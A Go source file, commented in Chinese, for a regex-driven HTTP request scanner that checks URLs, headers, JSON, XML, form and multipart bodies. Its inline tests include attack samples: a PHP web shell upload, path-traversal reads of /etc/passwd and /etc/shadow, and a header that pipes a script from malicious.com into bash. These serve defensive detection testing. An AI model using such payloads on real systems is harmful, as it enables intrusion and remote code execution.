// Package main 表示这是一个可执行程序。
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"gopkg.in/yaml.v3"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
)

// --- 数据结构与常量定义 ---
// SeverityLevel 定义了威胁的严重性级别。
type SeverityLevel string

// 定义了不同严重性级别的常量，与Python中的Enum等效。
const (
	CRITICAL SeverityLevel = "严重"
	HIGH     SeverityLevel = "高危"
	MEDIUM   SeverityLevel = "中危"
	LOW      SeverityLevel = "低危"
	INFO     SeverityLevel = "信息"
)

// ScanResult 存储单次安全扫描的匹配结果。
type ScanResult struct {
	RuleType   string        `json:"rule_type"`  // 规则类型，例如 "xss", "sqli"
	RuleName   string        `json:"rule_name"`  // 规则的具体名称
	Matched    string        `json:"matched"`    // 匹配到的恶意字符串
	Position   [2]int        `json:"position"`   // 匹配内容在输入中的开始和结束位置
	Context    string        `json:"context"`    // 匹配内容附带的上下文信息
	Severity   SeverityLevel `json:"severity"`   // 威胁严重性
	Confidence float64       `json:"confidence"` // 置信度
}

// CompiledRule 存储一个已编译的正则表达式规则及其元数据。
type CompiledRule struct {
	Name              string         // 规则名称
	Pattern           *regexp.Regexp // 已编译的Go正则表达式对象
	Severity          SeverityLevel  // 严重性
	DetectionLocation string         // 规则应用的检测位置 (例如 "URI", "body")
}

// --- YAML配置文件解析相关结构体 ---
// RuleConfig 用于解析config.yaml中每个规则块的结构。
type RuleConfig struct {
	Name              yaml.Node `yaml:"name"`
	Rules             yaml.Node `yaml:"rules"`
	Severity          yaml.Node `yaml:"severity"`
	DetectionLocation yaml.Node `yaml:"detection_location"`
}

// SafetyTestingConfig 是规则类型的映射，键是规则类型 (e.g., "xss")。
type SafetyTestingConfig map[string]RuleConfig

// Config 是整个config.yaml文件的顶层结构。
type Config struct {
	SafetyTesting SafetyTestingConfig `yaml:"safety_testing"`
}

// --- 安全扫描器核心实现 ---
// SecurityScanner 是安全扫描器的主要结构体，包含配置和已编译的规则。
type SecurityScanner struct {
	Config        *Config                   // 加载的配置
	CompiledRules map[string][]CompiledRule // 按规则类型分类的已编译规则
	MaxScanDepth  int                       // 最大递归扫描深度，防止无限循环
	scanCache     sync.Map                  // 用于缓存shouldScanLocation的结果，提升性能
}

// NewSecurityScanner 是SecurityScanner的构造函数。
func NewSecurityScanner(configPath string, maxScanDepth int) (*SecurityScanner, error) {
	scanner := &SecurityScanner{
		MaxScanDepth: maxScanDepth,
	}
	// 读取YAML配置文件
	yamlFile, err := os.ReadFile(configPath)
	if err != nil {
		return nil, fmt.Errorf("配置文件 %s 未找到: %v", configPath, err)
	}
	// 解析YAML内容到Config结构体
	var config Config
	err = yaml.Unmarshal(yamlFile, &config)
	if err != nil {
		return nil, fmt.Errorf("配置文件解析错误: %v", err)
	}
	scanner.Config = &config
	// 编译规则
	scanner.CompiledRules, err = scanner.compileRules()
	if err != nil {
		return nil, fmt.Errorf("规则编译失败: %v", err)
	}
	return scanner, nil
}

// loadRuleFromFile 从一个.rule文件加载规则列表。
func (s *SecurityScanner) loadRuleFromFile(filePath string) []string {
	content, err := os.ReadFile(filepath.Join("lib", filePath))
	if err != nil {
		log.Printf("警告: 规则文件 %s 未找到: %v", filePath, err)
		return nil
	}
	lines := strings.Split(string(content), "\n")
	var rules []string
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		// 忽略空行和注释行
		if trimmed != "" && !strings.HasPrefix(trimmed, "#") {
			rules = append(rules, trimmed)
		}
	}
	return rules
}

// compileRules 遍历从YAML加载的配置，编译所有正则表达式。
func (s *SecurityScanner) compileRules() (map[string][]CompiledRule, error) {
	compiled := make(map[string][]CompiledRule)
	for ruleType, ruleData := range s.Config.SafetyTesting {
		compiled[ruleType] = []CompiledRule{}
		// 解析规则名称 (可以是单个字符串或字符串列表)
		var ruleNames []string
		if ruleData.Name.Kind == yaml.SequenceNode {
			_ = ruleData.Name.Decode(&ruleNames)
		} else {
			var singleName string
			_ = ruleData.Name.Decode(&singleName)
			if singleName != "" {
				ruleNames = []string{singleName}
			}
		}
		// 解析检测位置
		var detectionLocations []string
		if ruleData.DetectionLocation.Kind == yaml.SequenceNode {
			_ = ruleData.DetectionLocation.Decode(&detectionLocations)
		} else {
			var singleLocation string
			_ = ruleData.DetectionLocation.Decode(&singleLocation)
			if singleLocation != "" {
				detectionLocations = []string{singleLocation}
			} else {
				detectionLocations = []string{"ALL"} // 默认为"ALL"
			}
		}
		// 解析规则 (可以是字符串，列表，或.rule文件)
		var rules []string
		if ruleData.Rules.Kind == yaml.SequenceNode {
			for _, ruleNode := range ruleData.Rules.Content {
				if strings.HasSuffix(ruleNode.Value, ".rule") {
					rules = append(rules, s.loadRuleFromFile(ruleNode.Value)...)
				} else {
					rules = append(rules, ruleNode.Value)
				}
			}
		} else if ruleData.Rules.Kind == yaml.ScalarNode {
			if strings.HasSuffix(ruleData.Rules.Value, ".rule") {
				rules = append(rules, s.loadRuleFromFile(ruleData.Rules.Value)...)
			} else {
				rules = append(rules, ruleData.Rules.Value)
			}
		}
		if len(rules) == 0 {
			continue
		}
		// 解析严重性级别
		var severitiesStr []string
		if ruleData.Severity.Kind == yaml.SequenceNode {
			_ = ruleData.Severity.Decode(&severitiesStr)
		} else {
			var singleSeverity string
			_ = ruleData.Severity.Decode(&singleSeverity)
			if singleSeverity != "" {
				severitiesStr = []string{singleSeverity}
			}
		}
		severities := processSeverities(severitiesStr, len(rules))
		// 组合规则、名称和严重性
		if len(rules) == len(ruleNames) {
			// 如果规则和名称数量相同，则一一对应
			for i, rule := range rules {
				for _, location := range detectionLocations {
					s.addCompiledRule(compiled, ruleType, ruleNames[i], rule, severities[i], location)
				}
			}
		} else {
			// 否则，每个规则都应用所有名称
			for i, rule := range rules {
				for _, name := range ruleNames {
					for _, location := range detectionLocations {
						s.addCompiledRule(compiled, ruleType, name, rule, severities[i], location)
					}
				}
			}
		}
	}
	return compiled, nil
}

// addCompiledRule 编译单个正则表达式并将其添加到已编译规则的映射中。
func (s *SecurityScanner) addCompiledRule(compiled map[string][]CompiledRule, ruleType, name, rule string, severity SeverityLevel, location string) {
	pattern, err := regexp.Compile(rule)
	if err != nil {
		log.Printf("警告: 规则 %s (%s) 编译失败: %v", ruleType, name, err)
		return
	}
	compiled[ruleType] = append(compiled[ruleType], CompiledRule{
		Name:              name,
		Pattern:           pattern,
		Severity:          severity,
		DetectionLocation: location,
	})
}

// processSeverities 确保严重性级别列表的长度与规则数量匹配。
func processSeverities(severities []string, ruleCount int) []SeverityLevel {
	if len(severities) == 0 {
		return repeatSeverity(MEDIUM, ruleCount)
	}
	processed := make([]SeverityLevel, 0, ruleCount)
	for _, sev := range severities {
		processed = append(processed, SeverityLevel(sev))
	}
	if len(processed) < ruleCount {
		processed = append(processed, repeatSeverity(MEDIUM, ruleCount-len(processed))...)
	}
	return processed[:ruleCount]
}

// repeatSeverity 创建一个重复N次的严重性级别切片。
func repeatSeverity(level SeverityLevel, count int) []SeverityLevel {
	severities := make([]SeverityLevel, count)
	for i := range severities {
		severities[i] = level
	}
	return severities
}

// shouldScanLocation 判断给定的规则位置是否应该在当前扫描位置上执行。
func (s *SecurityScanner) shouldScanLocation(location, current_location string) bool {
	if location == "" {
		return true
	}
	// 使用sync.Map作为并发安全的缓存
	cacheKey := location + "|" + current_location
	if val, ok := s.scanCache.Load(cacheKey); ok {
		return val.(bool)
	}
	conditions := strings.Split(location, "|")
	includeAll := false
	includeLocations := make(map[string]bool)
	excludeLocations := make(map[string]bool)
	for _, cond := range conditions {
		cond = strings.TrimSpace(cond)
		if cond == "" {
			continue
		}
		if strings.ToUpper(cond) == "ALL" {
			includeAll = true
		} else if strings.HasPrefix(cond, "!") {
			excludeLocations[strings.TrimPrefix(cond, "!")] = true
		} else {
			includeLocations[cond] = true
		}
	}
	// 排除优先级最高
	if excludeLocations[current_location] {
		s.scanCache.Store(cacheKey, false)
		return false
	}
	// 如果包含'ALL'且未被排除，则匹配
	if includeAll {
		s.scanCache.Store(cacheKey, true)
		return true
	}
	// 如果有明确的包含列表，则仅当当前位置在列表中时匹配
	if len(includeLocations) > 0 {
		result := includeLocations[current_location]
		s.scanCache.Store(cacheKey, result)
		return result
	}
	// 如果只有排除列表，则不匹配任何未明确排除的项
	if len(excludeLocations) > 0 {
		s.scanCache.Store(cacheKey, false)
		return false
	}
	// 如果没有任何条件，则默认匹配
	s.scanCache.Store(cacheKey, true)
	return true
}

// Scan 是最核心的扫描函数。
func (s *SecurityScanner) Scan(input []byte, scanLocation string, depth int) map[string][]ScanResult {
	if depth > s.MaxScanDepth {
		return nil
	}
	// 首先，检查输入是否是已知的二进制可执行文件格式。
	if isBinaryExecutable(input) {
		return map[string][]ScanResult{
			"binary_executable": {
				{
					RuleType:   "binary",
					RuleName:   "可执行文件上传",
					Matched:    "二进制可执行文件",
					Position:   [2]int{0, len(input)},
					Context:    "检测到二进制可执行文件内容",
					Severity:   HIGH,
					Confidence: 0.9,
				},
			},
		}
	}
	inputStr := string(input) // 将输入转换为字符串以进行正则匹配
	results := make(map[string][]ScanResult)
	var wg sync.WaitGroup
	var mu sync.Mutex // Mutex用于保护对results和matchedPositions的并发写入
	matchedPositions := make(map[[2]int]bool)
	// 遍历所有规则类型和规则
	for ruleType, rules := range s.CompiledRules {
		for _, rule := range rules {
			effectiveScanLocation := scanLocation
			if scanLocation == "r_body" {
				effectiveScanLocation = "body"
			}
			// 判断此规则是否适用于当前扫描位置
			if !s.shouldScanLocation(rule.DetectionLocation, effectiveScanLocation) {
				continue
			}
			// 为每个规则启动一个goroutine
			wg.Add(1)
			go func(ruleType string, rule CompiledRule) {
				defer wg.Done()
				matches := rule.Pattern.FindAllStringSubmatchIndex(inputStr, -1)
				localResults := []ScanResult{}
				for _, match := range matches {
					start, end := match[0], match[1]
					// 使用互斥锁来检查和更新已匹配的位置，防止重复报告
					mu.Lock()
					if _, exists := matchedPositions[[2]int{start, end}]; exists {
						mu.Unlock()
						continue
					}
					matchedPositions[[2]int{start, end}] = true
					mu.Unlock()
					// 创建扫描结果
					localResults = append(localResults, ScanResult{
						RuleType:   ruleType,
						RuleName:   rule.Name,
						Matched:    inputStr[start:end],
						Position:   [2]int{start, end},
						Context:    getContext(inputStr, start, end),
						Severity:   rule.Severity,
						Confidence: 0.8,
					})
				}
				// 如果有匹配结果，使用互斥锁将其添加到最终结果中
				if len(localResults) > 0 {
					mu.Lock()
					if _, ok := results[ruleType]; !ok {
						results[ruleType] = []ScanResult{}
					}
					results[ruleType] = append(results[ruleType], localResults...)
					mu.Unlock()
				}
			}(ruleType, rule)
		}
	}
	// 等待所有goroutine完成
	wg.Wait()
	// 递归扫描Base64编码的内容
	if depth < s.MaxScanDepth {
		base64Results := s.scanBase64Content(inputStr, scanLocation, depth+1)
		mergeResults(results, base64Results, "")
	}
	return results
}

// scanBase64Content 查找并解码字符串中的Base64编码内容，然后递归扫描。
func (s *SecurityScanner) scanBase64Content(inputStr, scanLocation string, depth int) map[string][]ScanResult {
	results := make(map[string][]ScanResult)
	// 正则表达式用于查找潜在的Base64字符串
	base64Pattern := regexp.MustCompile(`(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)?`)
	matches := base64Pattern.FindAllString(inputStr, -1)
	for _, match := range matches {
		// 尝试使用标准和URL两种Base64编码进行解码
		decoded, err := base64.StdEncoding.DecodeString(match)
		if err != nil {
			decoded, err = base64.URLEncoding.DecodeString(match)
			if err != nil {
				continue
			}
		}
		if len(decoded) > 10 { // 避免解码无意义的短字符串
			decodedResults := s.Scan(decoded, fmt.Sprintf("base64:%s", scanLocation), depth+1)
			if len(decodedResults) > 0 {
				mergeResults(results, decodedResults, "Base64解码内容: ")
			}
		}
	}
	return results
}

// --- 不同内容类型的解析器 ---
// ScanURL 专门用于扫描URL。
func (s *SecurityScanner) ScanURL(rawURL string) map[string][]ScanResult {
	decodedURL, err := url.QueryUnescape(rawURL)
	if err != nil {
		decodedURL = rawURL // 解码失败则回退到原始URL
	}
	results := s.Scan([]byte(decodedURL), "URI", 0)
	parsedURL, err := url.Parse(decodedURL)
	if err == nil {
		queryParams, _ := url.ParseQuery(parsedURL.RawQuery)
		for param, values := range queryParams {
			paramResults := s.Scan([]byte(param), "URI_key", 0)
			mergeResults(results, paramResults, fmt.Sprintf("URL参数键名称: %s", param))
			for _, value := range values {
				valueResults := s.Scan([]byte(value), "URI_value", 0)
				mergeResults(results, valueResults, fmt.Sprintf("URL参数值: %s", param))
			}
		}
	}
	return results
}

// ScanHeaders 扫描HTTP请求头。
func (s *SecurityScanner) ScanHeaders(headers http.Header) map[string][]ScanResult {
	results := make(map[string][]ScanResult)
	for key, values := range headers {
		for _, value := range values {
			headerResults := s.Scan([]byte(value), fmt.Sprintf("headers:%s", key), 0)
			mergeResults(results, headerResults, fmt.Sprintf("请求头: %s", key))
			// 兼容 'ALL_headers' 的检测位置
			allHeaderResults := s.Scan([]byte(value), "ALL_headers", 0)
			mergeResults(results, allHeaderResults, fmt.Sprintf("请求头: %s", key))
		}
	}
	return results
}

// ScanBody 根据Content-Type分发到不同的解析器处理请求体。
func (s *SecurityScanner) ScanBody(body []byte, contentType string) map[string][]ScanResult {
	mainContentType := strings.ToLower(strings.Split(contentType, ";")[0])
	switch mainContentType {
	case "application/json":
		return s.scanJSON(body, 0)
	case "application/xml", "text/xml":
		return s.scanXML(body, 0)
	case "application/x-www-form-urlencoded":
		return s.scanFormData(body)
	case "multipart/form-data":
		return s.scanMultipartFormData(body, contentType)
	default:
		// 对于未知类型，作为纯文本扫描
		return s.Scan(body, "body", 0)
	}
}

// scanJSON 解析JSON并递归扫描其键和值。
func (s *SecurityScanner) scanJSON(data []byte, depth int) map[string][]ScanResult {
	var v interface{}
	if err := json.Unmarshal(data, &v); err != nil {
		// 如果不是合法的JSON，作为纯文本扫描
		return s.Scan(data, "json_body", depth)
	}
	return s.scanJSONRecursive(v, "", depth)
}

// scanJSONRecursive 递归地遍历JSON对象(map或slice)。
func (s *SecurityScanner) scanJSONRecursive(data interface{}, path string, depth int) map[string][]ScanResult {
	if depth > s.MaxScanDepth {
		return nil
	}
	results := make(map[string][]ScanResult)
	switch v := data.(type) {
	case map[string]interface{}:
		for key, value := range v {
			currentPath := fmt.Sprintf("%s.%s", path, key)
			if path == "" {
				currentPath = key
			}
			// 扫描键
			keyResults := s.Scan([]byte(key), "json_key_body", depth)
			mergeResults(results, keyResults, fmt.Sprintf("JSON键名: %s", currentPath))
			// 递归扫描值
			mergeResults(results, s.scanJSONRecursive(value, currentPath, depth+1), "")
		}
	case []interface{}:
		for i, item := range v {
			currentPath := fmt.Sprintf("%s[%d]", path, i)
			mergeResults(results, s.scanJSONRecursive(item, currentPath, depth+1), "")
		}
	case string:
		// 扫描字符串值
		valueResults := s.Scan([]byte(v), "json_value_body", depth)
		mergeResults(results, valueResults, fmt.Sprintf("JSON字段: %s", path))
	}
	return results
}

// scanXML 使用Go的xml包来遍历XML文档树，扫描元素、属性和文本。
func (s *SecurityScanner) scanXML(data []byte, depth int) map[string][]ScanResult {
	decoder := xml.NewDecoder(bytes.NewReader(data))
	results := make(map[string][]ScanResult)
	var elements []string // 用于追踪当前路径
	for {
		token, err := decoder.Token()
		if err == io.EOF {
			break
		}
		if err != nil {
			// 如果XML无效，作为纯文本扫描
			return s.Scan(data, "xml_body", depth)
		}
		switch se := token.(type) {
		case xml.StartElement:
			elements = append(elements, se.Name.Local)
			path := strings.Join(elements, "/")
			// 扫描属性
			for _, attr := range se.Attr {
				attrPath := fmt.Sprintf("%s/@%s", path, attr.Name.Local)
				attrResults := s.Scan([]byte(attr.Value), "xml_attribute_body", depth)
				mergeResults(results, attrResults, fmt.Sprintf("XML属性: %s", attrPath))
			}
		case xml.CharData:
			// 扫描文本内容
			text := strings.TrimSpace(string(se))
			if text != "" {
				path := strings.Join(elements, "/")
				textResults := s.Scan([]byte(text), "xml_value_body", depth)
				mergeResults(results, textResults, fmt.Sprintf("XML文本: %s", path))
			}
		case xml.EndElement:
			// 路径出栈
			if len(elements) > 0 {
				elements = elements[:len(elements)-1]
			}
		}
	}
	return results
}

// scanFormData 解析 application/x-www-form-urlencoded 格式的数据。
func (s *SecurityScanner) scanFormData(formData []byte) map[string][]ScanResult {
	results := make(map[string][]ScanResult)
	params, err := url.ParseQuery(string(formData))
	if err != nil {
		return s.Scan(formData, "forms_body", 0)
	}
	for key, values := range params {
		keyResults := s.Scan([]byte(key), "json_key_body", 0)
		mergeResults(results, keyResults, fmt.Sprintf("表单参数名: %s", key))
		for _, value := range values {
			valueResults := s.Scan([]byte(value), "forms_value_body", 0)
			mergeResults(results, valueResults, fmt.Sprintf("表单参数: %s", key))
		}
	}
	return results
}

// scanMultipartFormData 使用mime/multipart包解析multipart/form-data格式的数据。
//
// func (s *SecurityScanner) scanMultipartFormData(data []byte, contentType string) map[string][]ScanResult {
// results := make(map[string][]ScanResult)
// // 从Content-Type中提取boundary
// boundaryParts := strings.Split(contentType, "boundary=")
// if len(boundaryParts) != 2 {
// return s.Scan(data, "multipart_body", 0)
// }
// boundary := boundaryParts[1]
//
// mr := multipart.NewReader(bytes.NewReader(data), boundary)
// for {
// part, err := mr.NextPart()
// if err == io.EOF {
// break
// }
// if err != nil {
// log.Printf("解析multipart数据出错: %v", err)
// continue
// }
//
// // 扫描文件名
// if fileName := part.FileName(); fileName != "" {
// log.Printf(fileName)
// fileNameResults := s.Scan([]byte(fileName), "multipart_file_name_body", 0)
// mergeResults(results, fileNameResults, "上传文件名: "+fileName)
// }
//
// // 读取并扫描part的内容
// partData, err := io.ReadAll(part)
// if err != nil {
// log.Printf("读取multipart part数据出错: %v", err)
// continue
// }
// if len(partData) > 0 {
// partContentType := part.Header.Get("Content-Type")
// // 递归调用ScanBody来处理part的内容
// bodyResults := s.ScanBody(partData, partContentType)
// mergeResults(results, bodyResults, "检测文件上传数据")
// }
// }
// return results
// }
//
// scanMultipartFormData 使用mime/multipart包解析multipart/form-data格式的数据。
func (s *SecurityScanner) scanMultipartFormData(data []byte, contentType string) map[string][]ScanResult {

	results := make(map[string][]ScanResult)

	// 1. 更加稳健的 Boundary 提取

	idx := strings.Index(contentType, "boundary=")
	if idx == -1 {
		return s.Scan(data, "multipart_body", 0)
	}
	boundary := contentType[idx+len("boundary="):]
	boundary = strings.Trim(boundary, "\" ")   // 去掉引号和空格
	boundary = strings.Split(boundary, ";")[0] // 防止后面跟着其他参数
	// 在 scanMultipartFormData 内部开头添加
	closingBoundary := "--" + boundary + "--"
	if !strings.Contains(string(data), closingBoundary) {
		// 如果没有结束符，说明数据被截断了，直接尝试全文正则扫描，
		// 而不使用 multipart 结构化解析，这样可以减少报错并保留一定的检测能力。
		return s.Scan(data, "truncated_multipart_body", 0)
	}
	mr := multipart.NewReader(bytes.NewReader(data), boundary)
	for {
		part, err := mr.NextPart()
		if err == io.EOF {
			break
		}
		if err != nil {
			// 如果是意外的结束，通常是因为数据截断。
			// 在流量分析中，我们可以记录为“截断数据”，而不是直接抛错。
			if strings.Contains(err.Error(), "EOF") {
				log.Printf("提示: Multipart 数据不完整（可能是抓包截断）")
			} else {
				log.Printf("解析multipart数据出错: %v", err)
			}
			break // 既然数据已经出错了，直接跳出循环
		}
		// 关键修复：从Content-Disposition头中直接提取原始文件名
		contentDisposition := part.Header.Get("Content-Disposition")
		if contentDisposition != "" {
			// 使用正则表达式提取原始文件名（包含路径）
			rawFileName := extractRawFileName(contentDisposition)
			if rawFileName != "" {
				// 扫描原始文件名（包含路径遍历等攻击）
				fileNameResults := s.Scan([]byte(rawFileName), "multipart_file_name_body", 0)
				mergeResults(results, fileNameResults, "上传文件名(原始): "+rawFileName)
				// 同时扫描清理后的文件名（Go标准库行为）
				if cleanFileName := part.FileName(); cleanFileName != "" && cleanFileName != rawFileName {
					cleanResults := s.Scan([]byte(cleanFileName), "multipart_file_name_body", 0)
					mergeResults(results, cleanResults, "上传文件名(清理后): "+cleanFileName)
				}
			} else {
				// 回退到标准库的清理后文件名
				if fileName := part.FileName(); fileName != "" {
					fileNameResults := s.Scan([]byte(fileName), "multipart_file_name_body", 0)
					mergeResults(results, fileNameResults, "上传文件名: "+fileName)
				}
			}
		}
		// 读取并扫描part的内容
		partData, err := io.ReadAll(part)
		if err != nil {
			log.Printf("读取multipart part数据出错: %v", err)
			continue
		}
		if len(partData) > 0 {
			partContentType := part.Header.Get("Content-Type")
			// 递归调用ScanBody来处理part的内容
			bodyResults := s.ScanBody(partData, partContentType)
			mergeResults(results, bodyResults, "检测文件上传数据")
		}
	}
	return results
}

// extractRawFileName 从Content-Disposition头中提取原始文件名
func extractRawFileName(contentDisposition string) string {
	// 正则表达式匹配 filename="..." 或 filename=... 格式
	pattern := `filename\s*=\s*"([^"]+)"|filename\s*=\s*([^;]+)`
	re := regexp.MustCompile(pattern)
	matches := re.FindStringSubmatch(contentDisposition)
	if len(matches) > 0 {
		// 优先使用引号内的值
		if matches[1] != "" {
			return matches[1]
		}
		if matches[2] != "" {
			return strings.TrimSpace(matches[2])
		}
	}
	return ""
}

// --- 辅助函数 ---
// getContext 生成并格式化匹配内容的上下文。
func getContext(text string, start, end int) string {
	lineNum := strings.Count(text[:start], "\n") + 1
	lineStart := strings.LastIndex(text[:start], "\n") + 1
	lineEnd := strings.Index(text[end:], "\n")
	if lineEnd == -1 {
		lineEnd = len(text)
	} else {
		lineEnd += end
	}
	fullLine := text[lineStart:lineEnd]
	prefixLen := len(fmt.Sprintf("行 %d: ", lineNum))
	marker := strings.Repeat("~", start-lineStart) + strings.Repeat("^", end-start)
	arrowLine := strings.Repeat(" ", start-lineStart) + "↑ 匹配内容"
	return fmt.Sprintf("\n行 %d: %s\n%s%s\n%s%s", lineNum, fullLine, strings.Repeat(" ", prefixLen), marker, strings.Repeat(" ", prefixLen), arrowLine)
}

// isBinaryExecutable 通过文件头的魔术数字(magic numbers)检测是否为可执行文件。
func isBinaryExecutable(data []byte) bool {
	if len(data) < 4 {
		return false
	}
	// ELF (Linux)
	if bytes.HasPrefix(data, []byte{0x7f, 'E', 'L', 'F'}) {
		return true
	}
	// PE (Windows)
	if bytes.HasPrefix(data, []byte{'M', 'Z'}) {
		return true
	}
	// Mach-O (macOS)
	if bytes.HasPrefix(data, []byte{0xfe, 0xed, 0xfa, 0xce}) || bytes.HasPrefix(data, []byte{0xfe, 0xed, 0xfa, 0xcf}) {
		return true
	}
	return false
}

// mergeResults 将新的扫描结果合并到主结果映射中。
func mergeResults(main, new map[string][]ScanResult, context string) {
	for ruleType, matches := range new {
		if _, ok := main[ruleType]; !ok {
			main[ruleType] = []ScanResult{}
		}
		for _, match := range matches {
			if context != "" {
				match.RuleName = fmt.Sprintf("%s | %s", context, match.RuleName)
			}
			main[ruleType] = append(main[ruleType], match)
		}
	}
}

// --- HTTP服务与内联测试 ---
// prettyPrintResults 将扫描结果格式化为易于阅读的JSON字符串并打印。
func prettyPrintResults(results map[string][]ScanResult) {
	if len(results) == 0 {
		fmt.Println("✅ 未检测到安全威胁")
		return
	}
	output, err := json.MarshalIndent(results, "", " ")
	if err != nil {
		log.Printf("无法格式化结果: %v", err)
		fmt.Println(results)
		return
	}
	fmt.Println(string(output))
}

// runInlineTests 运行一个内联测试套件，用于快速验证扫描器的功能。
func runInlineTests(scanner *SecurityScanner) {
	fmt.Println("--- Running Inline Tests ---")
	// multipart/form-data检测
	multipartData := "--WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"/../../test.php\"\nContent-Type: application/x-php\n\n<?php system($_GET[\"cmd\"]); ?>\n--WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"submit\"\n\nUpload\n--WebKitFormBoundary7MA4YWxkTrZu0gW--"
	fmt.Println("\n=== multipart/form-data测试 ===")
	multipartResults := scanner.ScanBody([]byte(multipartData), "multipart/form-data; boundary=WebKitFormBoundary7MA4YWxkTrZu0gW")
	prettyPrintResults(multipartResults)
	// URI检测
	testURI := "/usr/local/psa/admin/htdocs/domains/databases/phpmyadmin/libraries/?a=/../../test.php"
	fmt.Printf("\n=== URI测试 ===\n测试输入: %s\n", testURI)
	uriResults := scanner.ScanURL(testURI)
	prettyPrintResults(uriResults)
	// 更多URL测试用例
	testCases := []string{
		"/.git/config",
		"/etc/passwd",
		"/path/../../../etc/passwd",
		"/wp-admin/admin-ajax.php?action=exec&cmd=id",
		"php://filter/convert.base64-encode/resource=index.php",
		"/path?file=../../../../etc/shadow",
	}
	fmt.Println("\n=== 更多URL测试 ===")
	for _, test := range testCases {
		fmt.Printf("\n测试输入: %s\n", test)
		results := scanner.ScanURL(test)
		prettyPrintResults(results)
	}
	// 请求头检测
	headers := http.Header{}
	headers.Add("User-Agent", "gruntfile.js")
	headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	headers.Add("X-Forwarded-For", "127.0.0.1; curl http://malicious.com/exploit.sh | bash ")
	fmt.Println("\n=== 请求头测试 ===")
	headerResults := scanner.ScanHeaders(headers)
	prettyPrintResults(headerResults)
	// JSON数据检测
	jsonData := `{"test":{"@type":"java.lang.Exception","@type":"org.XxException"}}`
	fmt.Println("\n=== JSON测试 ===")
	jsonResults := scanner.ScanBody([]byte(jsonData), "application/json")
	prettyPrintResults(jsonResults)
	// XML数据检测
	xmlData := `<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<RetrieveServiceContent xmlns="urn:internalvim25">
<filePath>./../etc/passwd</filePath>
</RetrieveServiceContent>
</soap:Body>
</soap:Envelope>`
	fmt.Println("\n=== XML测试 ===")
	xmlResults := scanner.ScanBody([]byte(xmlData), "application/xml")
	prettyPrintResults(xmlResults)
	// 表单数据检测
	formData := "username=admin&password=123456&file=/../../etc/passwd"
	fmt.Println("\n=== 表单数据测试 ===")
	formResults := scanner.ScanBody([]byte(formData), "application/x-www-form-urlencoded")
	prettyPrintResults(formResults)
	fmt.Println("\n--- Inline Tests Finished ---")
}

// ScanRequest 定义了/scan接口接收的JSON请求的结构。
type ScanRequest struct {
	Type        string      `json:"type"`                   // 扫描类型: "url", "headers", "body"
	Content     interface{} `json:"content"`                // 扫描内容
	ContentType string      `json:"content_type,omitempty"` // 内容类型，主要用于body扫描
}

// main是程序的入口点。
//func main() {
//	// 检查配置文件是否存在，提供更友好的错误提示
//	if _, err := os.Stat("config.yaml"); os.IsNotExist(err) {
//		log.Fatalf("错误: config.yaml 未找到。请确保配置文件与程序在同一目录下。")
//	}
//
//	// 初始化扫描器
//	scanner, err := NewSecurityScanner("config.yaml", 10)
//	if err != nil {
//		log.Fatalf("无法初始化扫描器: %v", err)
//	}
//
//	// 在启动服务器之前，运行内联测试套件
//	runInlineTests(scanner)
//}
//
// // --- HTTP服务器逻辑 ---
// // 设置/scan路由的处理函数
// http.HandleFunc("/scan", func(w http.ResponseWriter, r *http.Request) {
// if r.Method != http.MethodPost {
// http.Error(w, "只接受POST请求", http.StatusMethodNotAllowed)
// return
// }
//
// body, err := io.ReadAll(r.Body)
// if err != nil {
// http.Error(w, "无法读取请求体", http.StatusInternalServerError)
// return
// }
//
// var req ScanRequest
// if err := json.Unmarshal(body, &req); err != nil {
// http.Error(w, "无效的JSON请求: "+err.Error(), http.StatusBadRequest)
// return
// }
//
// var results map[string][]ScanResult
//
// // 根据请求的类型调用相应的扫描函数
// switch req.Type {
// case "url":
// if content, ok := req.Content.(string); ok {
// results = scanner.ScanURL(content)
// } else {
// http.Error(w, "url类型扫描内容必须为字符串", http.StatusBadRequest)
// return
// }
// case "headers":
// if content, ok := req.Content.(map[string]interface{}); ok {
// headers := http.Header{}
// for k, v := range content {
// if vSlice, ok := v.([]interface{}); ok {
// for _, val := range vSlice {
// headers.Add(k, fmt.Sprintf("%v", val))
// }
// } else {
// headers.Add(k, fmt.Sprintf("%v", v))
// }
// }
// results = scanner.ScanHeaders(headers)
// } else {
// http.Error(w, "headers类型扫描内容必须为map[string][]string格式", http.StatusBadRequest)
// return
// }
// case "body":
// if content, ok := req.Content.(string); ok {
// results = scanner.ScanBody([]byte(content), req.ContentType)
// } else {
// http.Error(w, "body类型扫描内容必须为字符串", http.StatusBadRequest)
// return
// }
// default:
// http.Error(w, "无效的扫描类型, 必须是 'url', 'headers', 或 'body'", http.StatusBadRequest)
// return
// }
//
// // 将结果以JSON格式返回
// w.Header().Set("Content-Type", "application/json; charset=utf-8")
// if err := json.NewEncoder(w).Encode(results); err != nil {
// log.Printf("无法编码响应: %v", err)
// }
// })
//
// log.Println("--- 内联测试完成, 现在启动Web服务 ---")
// log.Println("完整版安全扫描服务正在启动，监听端口 :8080...")
// if err := http.ListenAndServe(":8080", nil); err != nil {
// log.Fatalf("服务启动失败: %v", err)
// }
//}
